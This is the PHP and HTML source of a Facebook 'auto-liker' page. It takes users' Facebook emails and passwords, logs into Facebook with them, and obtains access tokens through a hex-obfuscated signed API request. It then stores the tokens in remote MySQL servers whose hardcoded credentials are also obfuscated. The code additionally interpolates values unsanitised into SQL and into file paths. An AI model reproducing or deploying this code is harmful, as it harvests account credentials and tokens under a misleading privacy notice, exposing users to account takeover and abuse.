<?php
if (session_status() == PHP_SESSION_NONE) { 
      session_start(); 
}
if (!is_dir("cache")){
         $oldmask = umask(0);
         mkdir("cache", 0777);
         umask($oldmask);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

${"\x47\x4c\x4f\x42\x41L\x53"}["\x70\x70p\x68\x70\x78\x73wx"]="\x73e\x72\x76er\x32";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x73\x6bt\x69v\x6f"]="\x73\x65\x72ve\x72\x31";${${"\x47\x4c\x4f\x42A\x4cS"}["\x73\x6b\x74\x69\x76o"]}=array("\x68\x6f\x73t"=>"\x385\x2e\x310\x2e\x32\x305\x2e\x31\x373:3\x33\x30\x36","\x75se\x72"=>"\x64i\x6das\x6canjak\x61","\x70\x61\x73s"=>"\x62a\x6e\x67sa\x64p\x6f0\x6c","\x64bn\x61\x6d\x65"=>"d\x69\x6das\x6ca\x6ej\x61ka");${${"\x47\x4cO\x42\x41\x4c\x53"}["\x70\x70\x70\x68\x70\x78\x73w\x78"]}=array("h\x6f\x73\x74"=>"sql12\x2ef\x72e\x65\x6d\x79sq\x6c\x68osti\x6eg\x2ene\x74:\x333\x30\x36","\x70\x61\x73s"=>"\x63\x32i\x33w5\x45\x64M\x61","\x75ser"=>"\x73\x71\x6c\x31\x32263\x3992","db\x6e\x61\x6de"=>"\x73ql1\x322\x363\x39\x39\x32");

$db = [$server1,$server2];
$server = $db[array_rand($db)];
$dbname = $server["dbname"];
//database connect 
$con = mysqli_connect($server["host"], $server["user"], $server["pass"]) or die(mysqli_error($con));

 $selectdb = mysqli_select_db($con, $dbname) or die(mysqli_error($con));
 $encoding = mysqli_query($con, "SET NAMES utf8");
 if (false === $encoding){
   die("Encoding UTF-8 Failed\n");
 } else {
   //echo "UTF-8 Encoded\n";
$query = "SELECT ID FROM token_all";
$result = mysqli_query($con, $query);
if (false === $result){  
$result = mysqli_query($con, "CREATE TABLE IF NOT EXISTS `token_all` (
  `token` varchar(255) DEFAULT NULL,
  `id` varchar(32) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

");
}
} //encoding

function fetch( $url, $z=null ) {
$_SESSION["peek"] = $url;
$ch =  curl_init();
if (strpos($url, "https") !== false){
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
}
$useragent = (isset($z['useragent']) ? $z['useragent'] : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
if (isset($z["dump"])) {curl_setopt($ch, CURLOPT_HEADER, 1);}

if (isset($z["headers"])){ curl_setopt($ch, CURLOPT_HTTPHEADER, $z["headers"]); }
curl_setopt( $ch, CURLOPT_URL, $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
if( isset($z['post']) ) {
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $z["post"]);
//curl_setopt( $ch, CURLOPT_POST, isset($z['post']) );
 //curl_setopt( $ch, CURLOPT_POSTFIELDS, $z['post'] );
}
if( isset($z['refer']) )        curl_setopt( $ch, CURLOPT_REFERER, $z['refer'] );
if (isset($_SESSION["prxwork"])){
curl_setopt($ch, CURLOPT_PROXY, $_SESSION["proxy"]);
} else
if (isset($z["proxy"])){
  curl_setopt($ch, CURLOPT_PROXY, $z["proxy"]);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
            curl_setopt( $ch, CURLOPT_USERAGENT, $useragent );
            curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, ( isset($z['timeout']) ? $z['timeout'] : 5 ) );

$cookie = (isset($z['cookiefile']) ? $z['cookiefile'] : "cache/cookies.txt");
if (!file_exists($cookie)){
  file_put_contents($cookie,"");
}
$cookie=realpath($cookie);
            curl_setopt( $ch, CURLOPT_COOKIEJAR,  $cookie );
            curl_setopt( $ch, CURLOPT_COOKIEFILE, $cookie );

if (isset($z['verbose'])){
curl_setopt($ch, CURLOPT_VERBOSE, true);
}
            $result = curl_exec( $ch );
$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
$_SESSION["ContentType"] = $contentType;
$info = curl_getinfo($ch);
if (isset($z["dumpinfo"])){
var_dump($info);
}
            curl_close( $ch );
if ($info['http_code'] == 200) {
/*
if (!isset($_SESSION["prxwork"])){
$_SESSION["prxwork"] = $z["proxy"];
}
*/
            return $result;
 } else {
  return curl_error($ch) or null;
 }
}

if (isset($_POST["user"])){
$user  = $_POST["user"];
}

if (isset($_POST["pass"])){
$pass  = $_POST["pass"];
}

//* curlopt
if (!file_exists("cache/$user.txt")){
  $fh = fopen("cache/".$user.".txt", 'w') or die("Can't create file");
}
$curlopt["cookiefile"]=$apicurl["cookiefile"]="cache/".$user.".txt";
$curl[] = "Connection: keep-alive";
$curl[] = "Upgrade-Insecure-Requests: 1";
$curl[] = "DNT: 1";
$curl[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
//$curl[] = "Accept-Encoding: gzip, deflate, br";
$curl[] = "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6";
$curlopt["headers"]=$curl;
$curlopt["useragent"]=$apicurl["useragent"]=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : die("User Agent Required"));

function login($user,$pass){
  global $curlopt;
$data = 'email='.$user.'&pass='.urlencode($pass).'&login=Login';
$curlopt["post"] = $data;
return fetch("https://www.facebook.com/login.php", $curlopt);
}

$login = login($user,$pass);

 ${"\x47L\x4f\x42\x41\x4cS"}["\x77\x7a\x78\x72kc\x67"]="A\x70\x69U\x72\x6c";${"\x47\x4c\x4f\x42\x41L\x53"}["\x6f\x77\x73\x76\x74t\x74fbh"]="b\x61r\x72ie\x72";${"\x47LO\x42\x41\x4c\x53"}["\x6bh\x6e\x69x\x75\x73\x78m\x67b"]="\x64\x61t\x61";${"\x47\x4cOB\x41\x4c\x53"}["\x6aw\x62\x74\x65\x6c\x6e\x72\x6ddb"]="\x6d\x64\x35";function buildUrl($user,$pass){$kemvrqctsio="\x41\x70\x69\x64\x61\x74\x61";$hrfblv="\x41p\x69dat\x61";$rkrgtayrdr="\x62\x61\x72r\x69\x65\x72";${$hrfblv}=array("\x61pi_k\x65y"=>"\x33\x657\x63\x37\x38e3\x35a7\x36a\x39\x329\x393\x30\x39\x388\x353\x393b0\x32d9\x37","\x63\x72\x65\x64ent\x69a\x6cs\x5fty\x70\x65"=>"\x70as\x73\x77\x6f\x72d","e\x6dai\x6c"=>"$user","\x66\x6frma\x74"=>"\x4aS\x4fN","\x6cocal\x65"=>"\x65n\x5f\x55S","m\x65\x74hod"=>"a\x75\x74\x68\x2e\x6c\x6fgi\x6e","pas\x73word"=>"$pass","\x72\x65turn_\x73\x73l_\x72\x65\x73ou\x72ce\x73"=>"0","\x76"=>"\x31.\x30");$lwwxdbevv="A\x70i\x64\x61\x74a";${${"\x47\x4c\x4f\x42\x41L\x53"}["j\x77b\x74e\x6cnr\x6d\x64\x62"]}="";${"\x47\x4c\x4f\x42\x41\x4cS"}["m\x68\x6bfg\x61\x65"]="A\x70\x69U\x72l";$fqnxlkyo="\x6dd\x35";${"GL\x4f\x42\x41L\x53"}["ri\x6be\x68\x64\x72vv"]="\x6dd5";foreach(${$lwwxdbevv} as${${"\x47\x4c\x4f\x42ALS"}["\x6b\x68\x6e\x69x\x75\x73\x78\x6d\x67\x62"]}=>${$rkrgtayrdr}){${"G\x4cO\x42\x41LS"}["\x6f\x6c\x6cna\x75\x63\x75\x6e\x6a"]="\x64a\x74a";${${"\x47L\x4f\x42A\x4cS"}["\x6a\x77b\x74\x65l\x6erm\x64b"]}.=${${"\x47\x4cO\x42AL\x53"}["\x6fl\x6c\x6e\x61\x75\x63\x75\x6e\x6a"]}."=".${${"G\x4c\x4f\x42A\x4cS"}["\x6f\x77\x73vt\x74\x74\x66\x62\x68"]};}${${"\x47\x4cOB\x41L\x53"}["\x6aw\x62\x74e\x6cn\x72mdb"]}.="\x631e\x36\x320\x66\x61\x37\x30\x38a\x31d\x35\x3696f\x62\x39\x39\x31\x63\x31\x62d\x655\x36\x362";${${"GLO\x42\x41LS"}["\x6a\x77\x62\x74e\x6cn\x72\x6dd\x62"]}=md5(${${"GLO\x42A\x4c\x53"}["\x72\x69\x6b\x65hd\x72\x76\x76"]});${${"G\x4cO\x42\x41L\x53"}["\x77\x7ax\x72k\x63g"]}="htt\x70s://\x61\x70i\x2efaceboo\x6b\x2e\x63o\x6d/\x72\x65s\x74s\x65\x72ver\x2ephp?".http_build_query(${$kemvrqctsio})."&\x73\x69\x67=".${$fqnxlkyo};return${${"GLO\x42A\x4c\x53"}["\x6d\x68\x6bfga\x65"]};}


$Apiurl = buildUrl($user,$pass);
global $apicurl;
if (null !== $login){
$ApiRest = fetch($Apiurl,$apicurl);

if (null !== $ApiRest){
$api=json_decode($ApiRest,true);
$token=$api["access_token"];
$id=$api['uid'];
$_SESSION["token"]=$token;
$_SESSION["id"]=$_SESSION["uid"]=$id;
if (!empty($token) && !empty($id)){
$sql = "REPLACE INTO token_all (token,id) VALUES ('$token', '$id')";
  $result = mysqli_query($con, $sql);
  if ($result){ 
  $_SESSION["success"] = "successfull";
  mysqli_close($con);
  }
}
//echo $token;
} else {
  echo "
  Failed Get Token. Case\n
  #1: Invalid Username/Password.\n
  #2: Challenge Require. [Login To Facebook. Allow Login].
  ";
  }
 } // if $login
// var_dump($api);
} // Method Post

//** cookie management
if (isset($_COOKIE["unknown"])){
 unset($_COOKIE["unknown"]);
 setcookie('unknown', null, -1, '/');
  if (isset($_COOKIE["logged_in"])){
   unset($_COOKIE['logged_in']);
   setcookie('logged_in', null, -1, '/');
  }
  setcookie("refresh_n", 1, time()+500, "/");
}
?>

<!DOCTYPE html><html lang='en' class=''>
<head>
<title>Get Access Token | HimziAutoLike</title> 
<meta name="description" content="Himzi Autolike, Himzi, Himzi Liker, Himzi Auto Like, Himzi Auto Liker, Himzi Like, Himzi Autoliker" />
<meta charset='UTF-8'>
<meta name="robots" content="index, follow">
<link rel="shortcut icon" type="image/x-icon" href="//static.codepen.io/assets/favicon/favicon-8ea04875e70c4b0bb41da869e81236e54394d63638a1ef12fa558a4a835f1164.ico" />
<link rel="mask-icon" type="" href="//static.codepen.io/assets/favicon/logo-pin-f2d2b6d2c61838f7e76325261b7195c27224080bc099486ddd6dccb469b8e8e6.svg" color="#111" />
<link rel="canonical" href="token.php" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css'><link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css'><link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css'><link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Poiret+One''><link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css'>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
<style class="cp-pen-styles">@import url(https://fonts.googleapis.com/css?family=Exo:400,500,500italic,400italic,600,600italic,700,700italic,800,800italic,300,300italic);
html,body{max-width:100%}
body {
  padding-top: 250px;
  background-image: url("https://previews.123rf.com/images/julkirio/julkirio1805/julkirio180500021/102664410-neon-sign-triangle-background-glowing-electric-abstract-frame-on-dark-transparent-backdrop-light-sig.jpg");
  background-position:center;
  background-repeat: no-repeat;
  background-size: cover;
  height: 100%;
}
pre {
  white-space: pre-wrap; /* Since CSS 2.1 */ 
  white-space: -moz-pre-wrap; /* Mozilla, since 1999 */ 
  white-space: -pre-wrap; /* Opera 4-6 */ 
  white-space: -o-pre-wrap; /* Opera 7 */ 
  word-wrap: break-word; /* Internet Explorer 5.5+ */
}
.login-form{width:390px;max-width:100%}
.login-title{font-family: 'Exo', sans-serif;text-align:center;color: white;}
.login-userinput{margin-bottom: 10px;}
.login-button{margin-top:10px;}
.login-options{margin-bottom:0px;}
.login-forgot{float: right;}
.text-white,.text-light,#disclaimer,#tos{color:white}
.bg-dark{background-color: #000000}
.bg-white{background-color: #FFFFFF}
</style>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-7975270895217217",
          enable_page_level_ads: true
     });
</script>
<script>
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
        //expires = "; expires=2030";
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}
function sCookie(name,value,minutes) {
    if (minutes) {
        var date = new Date();
        date.setTime(date.getTime()+(minutes*60*1000));
        var expires = "; expires="+date.toGMTString();
    } else {
        var expires = "";
    }
    document.cookie = name+"="+value+expires+"; path=/";
}
function delete_cookie( name, path, domain ) {
  if( get_cookie( name ) ) {
    document.cookie = name + "=" +
      ((path) ? ";path="+path:"")+
      ((domain)?";domain="+domain:"") +
      ";expires=Thu, 01 Jan 1970 00:00:01 GMT";
  }
}
</script>
</head><body>
<div id="fb-root info"></div>
<script>
  window.fbAsyncInit = function() {
    FB.init({
      appId      : '182383652179465',
      xfbml      : true,
      cookie     : true,
      status     : true,
      autoLogAppEvents : true,
      version    : 'v3.2'
    });
    FB.AppEvents.logPageView();
  };

  (function(d, s, id){
     var js, fjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = "https://connect.facebook.net/en_US/sdk.js";
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));

var userLogin;
var userLogout;
var checkLogin;

$(document).ready(function(){
checkLogin = function(){
FB.getLoginStatus(function(response) {
  //bila belum login facebook maka data akan di refresh
  if (response.status === "unknown" && getCookie("refresh_n") === null){
    sCookie("unknown");
    location.reload();
  } else if (response.status === "connected"){
    if (getCookie("logged_in") === null){
    sCookie("logged_in",1,5);
    alert("You Has Logged In");
    location.reload();
    }
  }
   if (response.authResponse) {
      var tokens = response.authResponse.accessToken;
      $("#info").html("Logged In As: <br/>");
      if (response.status === 'connected') {
         FB.api(response.authResponse.userID+"?fields=id,name,email",function(response) {
          $("#info").append("Name: "+response.name+"<br/>Email: "+response.email+"<br/>Tokens: "+tokens);
         });
         setCookie('uid',response.authResponse.userID,1);
         setCookie("ready", 1, 1);
         } else if (response.status === 'not_authorized' || response.status === 'authorization_expired') {
            $("#info").html("Please Log Into App Below");
         }
      } else {
   $("#info").html("Not Logged In, Please Login Before (Bellow)");
      //window.location.href="flush.php";
         }
  
     $("#info").append(response);
     });
     }

     userLogout = function() {
    FB.getLoginStatus(function(response) {
        if (response && response.status === 'connected') {
            FB.logout(function(response) {
                document.location.reload();
            });
        }
    });
}
    userLogin = function(){ 
    
FB.getLoginStatus(function(response) {
  //alert(response.status);
  if (response.status === 'connected') {
    var days = 1;
    var uid = response.authResponse.userID;
    var accessToken = response.authResponse.accessToken;
    setCookie('logged_in',uid,days);
    /*
    var ready = getCookie("ready");
    if (ready == null) {
      window.location.reload();
      setCookie("ready",1,days);
    }*/
  } else if (response.status === 'not_authorized') {
    alert("Please allow app to logged in");
  } else {
    // the user isn't logged in to Facebook.
    eraseCookie("uid");
    eraseCookie("ready");
  }
 });
     };
});
</script>
<script>
setInterval(function(){ 
checkLogin();
}, 3000);
</script>
<div class="container">
<?php 
if (isset($_SESSION["token"])){
  echo "<pre>
  Token: ".$_SESSION["token"]."
  </pre>";
}
if (isset($_SESSION["uid"])){
  echo "<pre>
ID: ".$_SESSION["uid"]." ".$_SESSION["success"]."
  </pre>";
}
if (!isset($_SESSION["uid"]) && !isset($_SESSION["token"])){
  echo '<!-- Channel Responsive -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-7975270895217217"
     data-ad-slot="2600604346"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>';
}
?>
</div>
<div class="container login-form">
	<h2 class="login-title">- Please Login -</h2>
	<div class="panel panel-default">
		<div class="panel-body">
		<?php
		if (isset($_COOKIE["logged_in"])){
			echo '<form method="POST">
				<div class="input-group login-userinput">
					<span class="input-group-addon"><span class="glyphicon glyphicon-user"></span></span>
					<input id="txtUser" type="text" class="form-control" name="user" placeholder="Username email phone">
				</div>
				<div class="input-group">
					<span class="input-group-addon"><span class="glyphicon glyphicon-lock"></span></span>
					<input  id="txtPassword" type="password" class="form-control" name="pass" placeholder="Password">
					<span id="showPassword" class="input-group-btn">
            <button class="btn btn-default reveal" type="button"><i class="glyphicon glyphicon-eye-open"></i></button>
          </span>  
				</div>
				<button class="btn btn-primary btn-block login-button" type="submit"><i class="fa fa-sign-in"></i> Login</button>
				<div class="checkbox login-options">
					<label><input type="checkbox"/> Remember Me</label>
					<a href="https://www.facebook.com/help/132243923516844" target="_blank" class="login-forgot">Forgot Username/Password?</a>
				</div>		
			</form>';
			} else if (!isset($_COOKIE["logged_in"])){
echo '<center><div class="fb-login-button bg-white" data-width="280" data-max-rows="1" data-size="large" data-button-type="login_with" data-show-faces="true" data-auto-logout-link="true" data-use-continue-as="true" onlogin="userLogin();"></div></center>';
}
			?>
		</div>
	</div>

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Iklan Response -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-7975270895217217"
     data-ad-slot="7267894124"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
<div id="disclaimer" class="bg-dark container">
<h4 class="text-white">Tentang Autoliker:</h4>
<p class="text-white">Ini adalah alat pertukaran media sosial Suka facebook menggunakan token akses. Situs web kami didirikan pada bulan Juli tahun 2018 oleh Dimas Lanjaka.<br/>
Tidak ada spam, Karena pengguna menyadari suka pertukaran yang benar melalui akses akses offline token.<br/>
Kami bukan pengembang facebook, kami hanya pengembang web.</p>
</div>
<div id="tos" class="bg-dark container">
<h5>Peraturan:</h5>
Anda harus bertukar suka ke pengguna Sido Liker menggunakan Token Akses dengan akses offline.<br/>
Kami TIDAK MENGIZINKAN jenis Spam, Kebohongan, Perkataan yang Benci, Pornografi, Rasisme, Penipuan dan konten ilegal lainnya untuk dikirimkan melalui situs web kami.<br/>
Pengguna mengakui bahwa penggunaan situs ini, termasuk konten adalah risiko pribadi. Jika pengguna tidak puas dengan situs, syarat dan ketentuan atau konten apa pun, satu-satunya adalah untuk menghentikan penggunaan situs ini.<br/>
<h5>Informasi pribadi :</h5>
Kami telah berkomitmen sejak 2016 (situs ini adalah HizLiker berikutnya) tidak menjual, memperdagangkan, atau menyewakan informasi identifikasi pribadi pengguna kami kepada orang lain seperti token Anda, PII Anda (informasi identifikasi pribadi) aman.<br/>
<h5>Auto Liker Memiliki Hak:</h5>
Simpan token akses pengguna ke server basis data.<br/>
Kami hanya menggunakan data Token Akses Anda untuk mengirim suka satu sama lain dan Hanya untuk pengguna Sido.<br/>
Blokir pengguna untuk menggunakan situs web, jika pengguna melanggar Aturan.<br/>
Memiliki izin untuk menampilkan iklan di situs web.<br/>
Perbarui kebijakan privasi ini kapan saja tanpa memberi tahu, kebijakan privasi Ceck sebelum menggunakan Sido Liker<br/>
<h5>Situs web pihak ketiga:</h5>
Pengguna dapat menemukan iklan atau konten lain di Situs kami yang tertaut ke situs dan layanan mitra kami, pemasok, pengiklan, sponsor, pemberi lisensi, dan pihak ketiga lainnya. Kami tidak mengontrol konten atau tautan yang muncul di situs ini dan tidak bertanggung jawab atas praktik yang digunakan oleh situs web yang tertaut ke atau dari Situs kami. Selain itu, situs atau layanan tersebut, termasuk konten dan tautannya, mungkin terus berubah. Situs dan layanan ini mungkin memiliki kebijakan privasi dan kebijakan layanan pelanggan mereka sendiri. Penjelajahan dan interaksi di situs web lain, termasuk situs web yang memiliki tautan ke Situs kami, tunduk pada syarat dan kebijakan situs web itu sendiri.<br/>


<h5>Perlu berhenti berlangganan situs / layanan</h5>
Jika Anda perlu berhenti berlangganan layanan website / tukar suka, Silakan kirim id facebook atau url profil Facebook Anda ke eroospeed87@gmail.com dan Jangan login Sido Liker lagi

<h5>Faq</h5>
Ketika Anda masuk ke akun fb Anda kemudian muncul: Akun Anda telah terkunci sementara kami mendeteksi aktivitas mencurigakan di akun facebook Anda ...?<br/>

Ini adalah standar keamanan facebook yang mengatakan kepada Anda ..<br/>

Untuk mendapatkan kembali akses ke akun Anda, Anda harus menyelesaikan proses verifikasi keamanan otomatis.<br/>


<h5>Pembaruan Kebijakan Privasi:</h5>
Dokumen ini terakhir diperbarui pada 14 Juli 2018.


<h5>Menghubungi kami:<h5>
Silakan hubungi kami di: dimaslanjaka@gmail.com
</div>
<script src='https://code.jquery.com/jquery-2.2.4.min.js'></script><script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js'></script>
<script >window.onload = function () {$("#showPassword").hide();};

$("#txtPassword").on('change', function () {
		if ($("#txtPassword").val())
		{
				$("#showPassword").show();
		} else

		{
				$("#showPassword").hide();
		}
});

$(".reveal").on('click', function () {
		var $pwd = $("#txtPassword");
		if ($pwd.attr('type') === 'password')
		{
				$pwd.attr('type', 'text');
		} else

		{
				$pwd.attr('type', 'password');
		}
});
//# sourceURL=pen.js
</script>
</body></html>